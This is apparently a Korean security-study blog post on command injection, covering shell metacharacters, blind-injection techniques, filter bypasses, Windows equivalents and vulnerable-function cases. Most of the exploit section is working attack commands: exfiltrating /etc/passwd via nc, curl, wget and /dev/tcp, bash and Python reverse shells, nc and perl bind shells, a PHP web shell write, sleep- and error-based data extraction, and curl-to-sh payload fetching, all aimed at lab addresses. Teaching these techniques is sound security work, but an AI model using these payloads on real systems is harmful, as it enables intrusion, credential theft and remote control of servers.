---
title: "Command Injection"
date: 2022-03-15 +0900
author: J0ngBae
categories: [Web-Hacking]
tags: ['web', 'command injection', 'client side attack', '2022']
---

> 다양한 웹 애플리케이션 제작용 언어는 시스템에 내장되어있는 프로그램들을 호출할 수 있는 함수를 지원합니다. 각 언어별 시스템 함수로는 PHP의 `system`, Node JS의 `child_process`, 파이썬의 `os.system`이 있습니다. 이러한 함수는 전달된 인자를 셸 프로그램에 전달해 명령어를 실행합니다. 예를 들어, `system(“cat /etc/passwd”)`를 호출하면, 셸 프로그램으로 `cat /etc/passwd`를 실행한 것과 같습니다.
{: .prompt-tip }

## Command Injection

인젝션(Injection)은 악의적인 데이터를 프로그램에 입력하여 이를 시스템 명령어, 코드, 데이터베이스 쿼리 등으로 실행되게 하는 기법을 말함.

인젝션의 종류로는 SQL Injection도 존재한다. 이 중, 이용자의 입력을 시스템 명령어로 실행되게 하는 취약점을 Command Injection이라고 부름

Command Injection은 명령어를 실행하는 함수에 이용자가 임의의 인자를 전달할 수 있을 때 발생함. 시스템 함수를 사용하면 이용자의 입력을 소프트웨어의 인자로 전달할 수 있다.

- `os.system("ping [user-input]")`
- `os.system("cat [user-input]")`

위와 같은 형태로 쓰일 수 있다.

이러한 함수를 사용할 때, 이용자의 입력을 제대로 검사하지 않으면 임의 명령어가 실행될 수 있다. 이는 리눅스 셀 프로그램이 지원하는 다양한 메타 문자 때문이다.

`&&`, `;`, `|` 등을 사용하면 여러 개의 명령어를 연속으로 실행시킬 수 있다. 따라서 공격자는 메타 문자를 통해 임의 명령어를 실행하여 셀을 획득할 수 있다.

- **Figure 1. 메타 문자**

| 메타문자 | 설명 | Example |
| :--- | :--- | :--- |
| \`\` | 명령어 치환.<br>\`\` 안에 들어있는 명령어를 실행한 결과로 치환됩니다. | ```$ echo `echo BOB` ```<br>`BOB` |
| `$()` | 명령어 치환.<br> `$()` 안에 들어있는 명령어를 실행한 결과로 치환된다.<br>이문자는 위와 다르게 중복 사용이 가능하다. `(echo $(echo $(echo BOB)) )` | `$ echo $(echo BOB)`<br>`BOB` |
| `&&` | 명령어 연속 실행.<br>한 줄에 여러 명령어를 사용하고 싶을 때 사용.<br>앞 명령어에서 에러가 발생하지 않아야 뒷 명령어를 실행 | `$ echo hello && echo BOB`<br>`hello`<br>`BOB` |
| `||` | 명령어 연속 실행.<br>한 줄에 여러 명령어를 사용하고 싶을 때 하용.<br>앞 명령어에서 에러가 발생해야 뒷 명령어를 실행 | `$ cat / || echo BOB`<br>`cat: /: Is a directory`<br>`BOB` |
| `;` | 명령어 구분자.<br>한 줄에 여러 명령어를 사용하고 싶을 때 사용.<br>`;` 은 단순히 명령어를 구분하기 위해 사용하며,<br>앞 명령어의 에로 유무와 관계 없이 뒷 명령어를 실행함 | `$ echo hello ; echo BOB`<br>`hello`<br>`BOB` |
| `|` | 파이프. 앞 명령어의 결과가 뒷 명령어의 입력으로 들어감 | `$ echo id | /bin/sh`<br>`uid=1001(j0ngbae) gid=1001(j0ngbae) groups=1001(j0ngbae)` |
| `.` | 1. Location<br><br><br><br><br>2. sequence expression | `$ pwd<br>/tmp`<br>`$ cd .. ; pwd`<br>`/`<br><br>`$ echo {1..10}`<br>`1 2 3 4 5 6 7 8 9 10` |
| `>` | output redirection (write mode) | `$ id > /tmp/res.txt`<br>`$ cat /tmp/res.txt`<br>`uid=1001(j0ngbae) gid=1001(j0ngbae) groups=1001(j0ngbae)` |
| `>>` | output redirection (append mode) | `$ echo 'hello world !' >> /tmp/res.txt`<br>`$ id >> /tmp/res.txt`<br>`$ cat /tmp/res.txt`<br>`hello world !`<br>`uid=1001(j0ngbae) gid=1001(j0ngbae) groups=1001(j0ngbae)` |
| `&>` | standard output and error redirection (비표준) | `$ cat /etc/pass* &> /tmp/res.txt`<br>`$ cat /tmp/res.txt`<br>`root:x:0:0:root:/root:/bin/bash`<br>`daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`<br>`...`<br>`cat: /etc/passwd-: Permission denied` |
| `>&` | file descriptor redirection | `$ cat /etc/pass* > /tmp/res.txt 2>&1`<br>`$ cat /tmp/res.txt`<br>`root:x:0:0:root:/root:/bin/bash`<br>`daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`<br>`...`<br>`cat: /etc/passwd-: Permission denied` |
| `<` | input redirection (read mode) | `$ cat</etc/passwd`<br>`root:x:0:0:root:/root:/bin/bash`<br>`daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`<br>`bin:x:2:2:bin:/bin:/usr/sbin/nologin`<br>`sys:x:3:3:sys:/dev:/usr/sbin/nologin`<br>`...` |
| `{ }` | Brace Expansion (Group Command) | `# stdout group example`<br>`$ { id; ls; } > /tmp/res.txt`<br>`$ cat /tmp/res.txt`<br>`uid=1001(j0ngbae) gid=1001(j0ngbae) groups=1001(j0ngbae)`<br>`bin`<br>`boot`<br>`dev`<br>`etc`<br>`home`<br>`...` |
| `?` | wildcards(question mark) | `$ ls /bin/c??`<br>`/bin/cat` |
| `*` | wildcards (asterisk) | `$ ls /bin/c*`<br>`/bin/cat /bin/chacl /bin/chgrp /bin/chmod /bin/chown /bin/chvt /bin/cp /bin/cpio` |
| `~` | Home Directory | `$ cd ~`<br>`$ pwd`<br>`/home/dreamhack` |

## Exploit Technique

Command Injection 취약점을 통해 원하는 정보를 얻는 과정에서 어플리케이션 코드/설정 또는 WAF(Web Application Firewall, 웹 방화벽) 등에  의해 공격이 제한되는 상황이 발생할 수 있다.

- 실행 결과를 확인할 수 없는 상황
    
    Command Injection 취약점이 발생하여 원하는 명령어를 실행할 수 있지만 결과를 직접적으로 확인할 수 없는 상황에서 사용할 수 있는 공격 방법
    
- 입력 값의 길이/내용이 제한된 상황
    
    Command Injection이 발생하는 데이터에 사용자의 입력 값이 제한적으로 입력되는 상황에서 사용할 수 있는 공격 방법

### 실행 결과를 확인할 수 없는 환경 - 1

> Command Injection 취약점이 발생해 원하는 OS명령어를 실행할 수 있지만, 실행 결과가 사용자에게 노출되지 않는 상황에서 활용할 수 있는 공격 방법
{: .prompt-tip }

- Network Outbound
    - OS 명령어를 실행한 결과를 네트워크 도구를 이용해 외부 서버로 전송시키는 방법
- Reverse Shell / Bind Shell
    - Reverse Shell은 취약점이 발생하는 서버에서 공격자의 서버로 쉘을 연결(Network Outbound), Bind Shell은 특정 포트로 쉘을 서비스하는 것을(Network Inbound)의미
- 파일 생성
    - 어플리케이션 상에서 직접적으로 확인할 수 있는 파일 시스템 경로에 결과를 포함한 파일을 생성하거나, 어플리케이션 로직을 통해 확인할 수 있는 공간에 파일을 생성시켜 확인하는 방법

#### Network Outbound

- nc (netcat)
    
    ```bash
    cat /etc/passwd | nc 127.0.0.1 8080
    ```
    
    위와 같이 네트워크 도구를 통해 특정 IP/PORT에 결과를 전송하며, 아래와 같이 네트워크 도구를 이용해 전송된 데이터 내용을 확인할 수 있다.
    
    ```bash
    $ nc -l -p 8080 -k -v
    Listening on [0.0.0.0] (family 0, port 8080)
    Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42396)
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    ...
    ```
    
- telnet
    
    ```bash
    cat /etc/passwd | telnet 127.0.0.1 8080
    ```
    
- curl / wget
    
    ```bash
    # GET parameter에 실행 결과 포함(개행으로 인해 오류가 발생할 수 있기 때문에 base64인코딩을 통해 개행 제거.)
    curl "http://127.0.0.1:8080/?$(ls -al | base64 -w0)"
    
    # POST Body에 실행 결과 포함
    curl http://127.0.0.1:8080/ -d "$(ls -al)"
    wget http://127.0.0.1:8080 --method=POST --body-data="`ls -al`"
    ```
    

- /dev/tcp, /dev/udp (bash 한정)
    
    ```bash
    cat /etc/passwd > /dev/tcp/127.0.0.1/8080
    ```
    

#### Reverse Shell

- sh (bash)
    
    ```bash
    /bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
    /bin/sh -i >& /dev/udp/127.0.0.1/8080 0>&1
    ```
    
    연결을 받는 서버에서 아래와 같이 nc 등의 네트워크 도구를 통해 연결을 맺게 되면 쉘을 획득할 수 있다.
    
    ```bash
    b3ll@LAPTOP-9RLP0NRO:~$ nc -l -p 8080 -k -v
    Listening on [0.0.0.0] (family 0, port 8080)
    Connection from localhost 49436 received!
    $ id
    uid=1000(b3ll) gid=1000(b3ll) groups=1000(b3ll),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),114(netdev),115(docker)
    ```
    

- Python
    
    ```bash
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```
    
    ```bash
    (venv) \[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ ls
    BOB
    codegate
    codegate_old
    dreamhack
    ```
    

#### Bind Shell

- nc (netcat)

```bash
# nc 버전에 따라 -e 옵션을 지원하지 않을 수도 있습니다.
nc -nlvp 8080 -e /bin/sh
ncat -nlvp 8080 -e /bin/sh
```

- perl

```bash
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

#### File Create

- Scripting Engine
    
    웹 루트 하위에 있는 폴더에 해석 가능한 (php/jsp/asp) 파일을 만들어 웹쉘 형태로 접근하는 방식이다.
    
    ```bash
    printf '<?=system($_GET[0])?>' /var/www/html/uploads/shell.php
    ```
    
    파일 생성이 가능한 권한이 있는 디렉토리에 파일을 생성하여 아래와 같이 웹쉘 형태로 사용 가능
    

- Static File Directory
    
    프레임 워크 또는 다양한 웹 어플리케이션에서는  JS/CSS/Img 등의 정적 리소스를 다루기 위해 Static File Directory를 사용한다. 해당 디렉토리에 OS 명령어의 결과를 파일로 생성시킨 후 접근하는 방법을 통해 결과를 확인할 수 있다.
    
    대표적인 예시로 Python의 Flask 프레임워크는 기본 설정 상 static 디렉토리의 이름이 static으로 설정되어 있다. 또한 Static 디렉토리를 생성하지 않은 상황에서도 OS 명령어를 통해  static 디렉토리를 생성한 후 해당 디렉토리를 생성한 후 해당 디렉토리 내에 파일을 생성하여 확인 할 수 있다. (프레임워크가 동작하는 디렉토리에 대한 권한이 존재하여야 디렉토리를 생성할 수 있다.
    
    ```bash
    /?cmd=mkdir static; id > static/result.txt
    ```
    

### 실행 결과를 확인할 수 없는 환경 - 2

> Network In/Outbound가 막혀 있고 파일로 출력 값을 redirection시켜 결과를 확인할 수 없는 상황에서는 참/거짓 판별로 추출해야 한다.
비교문을 통해 데이터를 비교하고, 참/거짓을 판별할 수 있는 방법이 있으면 된다.
{: .prompt-tip }

#### 지연 시간 (Sleep)

비교하는 값이 참일 경우 sleep 명령어를 통해 지연시간을 발생시켜 확인

- `id` 명령어의 결과를 확인하고 싶을 때 해당 데이터를 base64로 치환한 후 참/거짓 판별을 통해 해당 데이터를 알아낼 수 있다.

```bash
$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ id | base64 -w 0
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
```

- 참/거짓 여부는 바이트 한 개가 입력 값과 일치할 때 `sleep` 명령어를 통해 서버 응답을 지연시켜 알아낼 수 있다.

```bash
bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then sleep 2; fi;" # --> sleep for 0 seconds; false
bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
```

#### 에러 (DoS)

비교하는 값이 참일 경우 시스템 에러를 발생시켜 500코드 (또는 서버 에러를 뜻하는 HTTP 상태 코드)를 확인한다.

- `id` 명령어의 결과를 확인하고 싶을 때 해당 데이터를 base64로 치환한 후 참/거짓 판별을 통해 해당 데이터를 알아낼 수 있다.
- sleep 명령을 사용할 수 없거나, 시간 지연을 확실히 판별하기 어려운 경우  HTTP 500 에러 (Internal Server Error)를 인위적으로 발생시키는 방법을 통해 참/거짓 판별을 할 수 있다.
- 다양한 방법이 존재하며, 간단한 방법으로는 `cat /dev/urandom` 명령어가 있다. 해당 명령어를 실행시키면 아래와 같이 할당된 메모리를 초과하는 에러를 발생시킬 수 있다.

```bash
2020/05/27 09:46:14 [error] 1572#1572: *297 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 98566176 bytes) in /var/www/html/x.php on line 6" while reading response header from upstream, client: 183.98.35.161, server: demo.dreamhack.io, request: "GET /m.php?cmd=bash%20-c%20%22printenv;a=\$(id%20|%20base64%20-w%200);%20if%20[%20\${a:0:1}%20==%20%27z%27%20];%20then%20sleep%202;%20fi;%22;%20echo%201;cat%20/dev/urandom HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.2-fpm.sock:", host: "demo.dreamhack.io"
```

```bash
bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then cat /dev/urandom; fi;" # --> 500 true
bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then cat /dev/urandom; fi;" # --> 500 true
bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then cat /dev/urandom; fi;" # --> 200 false
bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then cat /dev/urandom; fi;" # --> 500 true
```

### 입력 길이가 제한된 상황 - 1

---

입력길이가 제한된 상황에선 앞서 배운 append redirection을 이용해 사용자가 쓰기 권한을 갖고 있는 임시 폴더에 파일을 만드는 방법으로 활용할 수 있다.

한 글자씩 원하는 문자를 파일에 저장한 후 `bash` 나 `python` 과 같은 인터프리터를 이용해 실행하는 방식이다.

아래의 명령어들은 입력 길이가 제한된 상황에서 공격자의 서버와 리버스 연결을 맺는 예제이다.

```bash
printf bas>/tmp/1
printf h>>/tmp/1
printf \<>>/tmp/1
printf /d>>/tmp/1
printf ev>>/tmp/1
printf /t>>/tmp/1
printf cp>>/tmp/1
printf />>/tmp/1
printf 1 >>/tmp/1
printf 2 >>/tmp/1
printf 7.>>/tmp/1
printf 0.>>/tmp/1
printf 0.>>/tmp/1
printf 1/>>/tmp/1
printf 1 >>/tmp/1
printf 2 >>/tmp/1
printf 3 >>/tmp/1
printf 4 >>/tmp/1
bash</tmp/1&
```

Line 1 ~ 18: 공격자의 원하는 입력을 1 ~ 3바이트씩 입력한다. 이를 통해 /tmp/1 파일에는 `bash</dev/tcp/127.0.0.1/1234` 의 데이터가 입력된다.

Line 15 ~ 18: 숫자 뒤에 스페이스를 추가한 이유는 file descriptor로 인식되지 않기 위해서이다.

Line 19: `/tmp/1` 의 내용을 stdin으로 bash를 실행하여 리버스 쉘을 맺을 수 있다.

```bash
$ nc -l -p 1234 -k -v
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 127.0.0.1 52536 received!
bash>&0 2>&0
id
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
```

Line 1~2: 1234 포트로 tcp 연결을 기다리는 nc 명령어이다.

Line 3: 연결이 맺어짐을 알려준다

Line4: stdout과 stderr를 0번 fd(socket)로 redirection 시키는 bash를 생성한다. 이를 통해 원격의 데이터를 현재 소켓으로 출력할 수 있다.

### 입력 길이가 제한된 상황 - 2

---

네트워크를 통해 사용할 명령어를 전송하는 방법도 존재한다.

IP Address를 더욱 짧게 입력하기 위한 방법으로는 짧은 길이의 도메인을 사용하거나, ip2long 등이 있다.

IP Address는 long 형식으로 변환이 가능하고 다양한 어플리케이션에서 사용이 가능하다.

아래 코드 외에도 다양한 방법을 통해 변환할 수 있다.

```bash
#!/usr/bin/python3
import ipaddess
int(ipaddress.IPv4Address("127.0.0.1")) # 2130706433
```

네트워크를 통해 공격 시 먼저 Command Injection 취약점이 발생하는 쉘이 최종적으로 실행할 명령어가 포함된 페이지를 작성한다.

- index.html

```bash
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("127.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

네트워크 도구(curl, wget 등)를 통해 외부 서버에 존재하는 index.html를 다운받아 실행할 수 있도록 메타문자를 설정할 수 있다.

```bash
curl 2130706433|sh
$(curl 2130706433)
`curl 2130706433`
```

위 명령어가 성공적으로 실행하게 되면 아래와 같이 리버스 쉘이 실행되는 것을 확인할 수 있다.

```bash
$ nc -l -p 1234 -k -v
Listening on [0.0.0.0] (family 0, port 1234)
Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 53220)
$ id
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
$
```

### 입력 값의 내용이 제한된 상황

---

command Injection 취약점이 발생하지만 입력하는 데이터 내용에 대한 검증 또는 어플리케이션의 로직에 의해 원하는 내용을 직접적으로 입력하지 못하는 상황에서 주로 쉘에서 제공하는 기능 또는 환경 변수 등을 이용하여 최종적으로 원하는 명령어를 실행할 수 있다.

- Whitespace

```bash
\x09(TAB)
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'\x20';cat${X}/etc/passwd
X=$'\040';cat${X}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

- KeyWord

```bash
# /bin/cat 명령어를 아래와 같은 방법들을 통해 우회하여 사용 가능합니다.
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
c''a""t /etc/passwd
\c\a\t /etc/passwd
c${invalid_variable}a${XX}t /etc/passwd
echo -e "\x69\x64" | sh
echo $'\151\144'| sh
X=$'\x69\x64'; sh -c $X
xxd -r -p <<< 2f6574632f706173737764 # /etc/passwd
cat `xxd -r -p <<< 2f6574632f706173737764`
```

- Comments

```bash
ping "127.0.0.1"; id # "
```

## Windows 환경

Windows 환경의 cmd.exe는 Linux(Unix) 계열의 쉘과 다른 부분이 있다.

### Linux 환경과 대응하는 쉘 메타문자

| Linux | Windows (cmd, powershell) | 설명 |
| :--- | :--- | :--- |
| `-A`, `--A` | `/c` | 커맨드 라인 옵션 |
| `$PATH` | `%PATH%` | 환경 변수 |
| `$ABCD` | `$ABCD` (powershell only) | 쉘 변수 |
| `;` | `&` (cmd only)<br>`;` (powershell only) | 명령어 구분자 |
| `echo $(id)` | `for /f "delims=" %a in ('whoami') do echo %a` | 명령어 치환 |
| `> /dev/null` | `> NUL` (cmd only)<br>`| Out-Null` (powershell only) | 출력 제거 |
| `command || true` | `command & rem` (cmd only)<br>`command -ErrorAction SilentlyContinue` (powershell Cmdlet only) | command 명렁어 오류 무시 |

### Linux 환경과 대응하는 명령어

- Linux 환경에 대응하는 대표적인 Windows 명령어는 아래와 같다.

| Linux | Windows | 설명 |
| :--- | :--- | :--- |
| ls | dir | 디렉토리(폴더) 파일 목록 출력 |
| cat | type | 파일 내용 출력 |
| cd | cd | 디렉토리(폴더) 이동 |
| rm | del | 파일 삭제 |
| mv | move | 파일 이동 |
| cp | copy | 파일 복사 |
| ifconfig | ipconfig | 네트워크 설정 |
| env, export | set | 환경변수 설정 |

## Command Injection Bug Cases

### open

- ruby와 perl의 Input/Output Util 함수인 open은 command 처리를 지원합니다. 아래 코드는 open 함수의 원형인데, 첫 글자가 `|` (pipe/vertical bar) 문자일 경우 `pipe_open` 을 통해 커맨드를 처리한다.

```ruby
// https://github.com/ruby/ruby/blob/0e3b0fcdba70cf96a8e0654eb8f50aacb8024bd4/io.c#L7161-L7175
static VALUE
check_pipe_command(VALUE filename_or_command)
{
    char *s = RSTRING_PTR(filename_or_command);
    long l = RSTRING_LEN(filename_or_command);
    char *e = s + l;
    int chlen;
    if (rb_enc_ascget(s, e, &chlen, rb_enc_get(filename_or_command)) == '|') {
        VALUE cmd = rb_str_new(s+chlen, l-chlen);
        return cmd;
    }
    return Qnil;
}
/*
 * 
 * open("|id")
 *
 */
static VALUE
rb_f_open(int argc, VALUE *argv, VALUE _)
{
    ID to_open = 0;
    int redirect = FALSE;
    if (argc >= 1) {
	CONST_ID(to_open, "to_open");
	if (rb_respond_to(argv[0], to_open)) {
	    redirect = TRUE;
	}
	else {
	    VALUE tmp = argv[0];
	    FilePathValue(tmp);
	    if (NIL_P(tmp)) {
		redirect = TRUE;
	    }
	    else {
                VALUE cmd = check_pipe_command(tmp);
                if (!NIL_P(cmd)) {
		    argv[0] = cmd;
		    return rb_io_s_popen(argc, argv, rb_cIO);
		}
```

```ruby
rb_define_global_function("open", rb_f_open, -1);
```

`rb_defien_global_function` 으로 등록된 open 말고도 다른 함수들도 똑같이 커맨드 인젝션에 취약하다.

```ruby
static VALUE
rb_io_open_generic(VALUE klass, VALUE filename, int oflags, int fmode,
		   const convconfig_t *convconfig, mode_t perm)
{
    VALUE cmd;
    if (klass == rb_cIO && !NIL_P(cmd = check_pipe_command(filename))) {
	return pipe_open_s(cmd, rb_io_oflags_modestr(oflags), fmode, convconfig);
    }
    else {
	return rb_file_open_generic(io_alloc(klass), filename,
				    oflags, fmode, convconfig, perm);
    }
}
```

rb_io_s_binread, rb_io_open, rb_io_s_read를 사용한 `IO.read`, `IO.bindread`등이 커맨드를 처리해 실행한다.

```ruby
irb(main):001:0> open("|id > /tmp/1")
=> #<IO:fd 11>
irb(main):002:0> IO.read("/tmp/1")
=> "uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)\n"
irb(main):003:0> IO.read("|id")
=> "uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)\n"
irb(main):004:0> IO.binread("|id")
=> "uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)\n"
irb(main):005:0>
----
$ perl -e 'open A, "|id"'
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
```

### escapeshellcmd

- 아래 php 코드는 Command Injection에 취약한 코드이다.

```php
<?php
  $cmd = "ls ".$_GET['filename']." 2>&1";
  system($cmd);
```

```php
dreamhack@ubuntu:~$ curl 'http://dreamhack.local/a.php?filename=-al /etc/passwd; id'
-rw-r--r-- 1 root root 1602 May  4 04:35 /etc/passwd
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
```

Command Injection을 막기 위해 다른 커맨드를 실행할 수 있는 메타 문자를 모두 이스케이프 처리해 주는 `escapeshellcmd` 를 활용해 패치해보았다.

```php
<?php
  $cmd = "ls ".escapeshellcmd($_GET['filename'])." 2>&1";
  system($cmd);
```

특정 커맨드의 인자로 입력  값을 사용할 때 `escapeshellarg` 대신 `escapeshellcmd` 를 사용할 경우 공격자는 임의 인자를 추가적으로 입력할 수 있게 된다.

```php
php > var_dump(escapeshellcmd("a -h -d -e"));
string(10) "a -h -d -e"
php > var_dump(escapeshellarg("a -h -d -e"));
string(12) "'a -h -d -e'"
php >
```

`escapeshellcmd`함수를 사용하면 아래와 같이 메타 문자는 사용하지 못하지만, `ls` 명렁어의 옵션 또는 인자를 조작할 수 있다.

```bash
dreamhack@ubuntu:~$ curl 'http://dreamhack.local/a.php?filename=-al%20/etc/passwd;%20id'
ls: cannot access '/etc/passwd;': No such file or directory
ls: cannot access 'id': No such file or directory
dreamhack@ubuntu:~$ curl 'http://dreamhack.local/a.php?filename=-al%20/etc/passwd'
-rw-r--r-- 1 root root 1602 May  4 04:35 /etc/passwd
```

### 취약한 실행 파일

> `ls` 명령어에 옵션을 추가한다고 해서 특별히 커맨드 실행이 가능한 것은 아니다. 하지만 몇개의 프로그램에서는 옵션으로 원하는 커맨드를 실행할 수 있는 기능을 제공하고 있다. 대표적인 프로그램으로 zip / python이 있으며 해당 기능은 다음과 같이 이용할 수 있다.
{: .prompt-tip }

- zip

```bash
# zip /tmp/test.zip /etc/passwd -T --unzip-command="sh -c id"
$ strace -e execve zip /tmp/test.zip /etc/passwd -T --unzip-command="sh -c id"
execve("/usr/bin/zip", ["zip", "/tmp/test.zip", "/etc/passwd", "-T", "--unzip-command=sh -c id"], 0x7fffe1dc1320 /* 31 vars */) = 0
updating: etc/passwd (deflated 64%)
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=13097, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
test of /tmp/test.zip OK
+++ exited with 0 +++
```

- python

```bash
# python -c "[Python Code]" input.py
$ python -c '__import__("os").system("id")' input.py
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
```

## curl / wget

> curl과 wget 명령어는 URL을 입력으로 받은 후 접속하는 CLI 프로그램이다. 앞선 예제처럼 원하는 커맨드를 실행할 순 없지만 옵션을 통해 임의 경로에 다운로드 결과를 저장할 수 있다.
{: .prompt-tip }

```bash
$ curl -h | grep " -o," 
			-o, --output <file> Write to file instead of stdout
$ wget -h | grep " -O" 
			-O,  --output-document=FILE      write documents to FILE
```

아래 예시와 같이 URL을 통해 다운로드 받은 결과를 옵션으로 지정된 파일 이름으로 저장할 수 있다.

```bash
$ curl  http://dreamhack.local -o hello.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   288  100   288    0     0  10666      0 --:--:-- --:--:-- --:--:-- 10666
$ cat hello.txt 
Hello !
$ wget http://dreamhack.local -O hello.txt
--2020-05-20 14:28:56--  http://dreamhack.local/
Resolving dreamhack.local (dreamhack.local)... 127.0.0.1
Connecting to dreamhack.local (dreamhack.local)|127.0.0.1|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 288 [text/html]
Saving to: ‘hello.txt’
hello.txt                    100%[============================================>]     288  --.-KB/s    in 0s      
2020-05-20 14:28:56 (22.9 MB/s) - ‘hello.txt’ saved [288/288]
$ cat hello.txt 
Hello !
```

## Summary

- Injection
    - 악의적인 데이터를 프로그램에 입력하여 이를 시스템 명령어, 코드, 데이터베이스 쿼리 등으로 실행되게 하는 기법. 웹 애플리케이션을 대상으로 하는 인젝션 공격은 SQL Injection, command injection등이 있음.

- Command Injection
    - 인젝션의 종류 중 하나. 시스템 명령어에 대한 인젝션을 의미함. 취약점이 발생하는 원인은 단순하지만, 매우 치명적인 공격으로 이어질 수 있음. 개발자는 이용자의 입력을 반드시 검사해야 하며, 되도록 `system`함수의 사용을 자제해야 함.

- 메타 문자(Meta Character)
    - 셸 프로그램에서 특수하게 처리하는 문자. `;`를 사용하면 여러 개의 명령어를 순서대로 실행시킬 수 있음.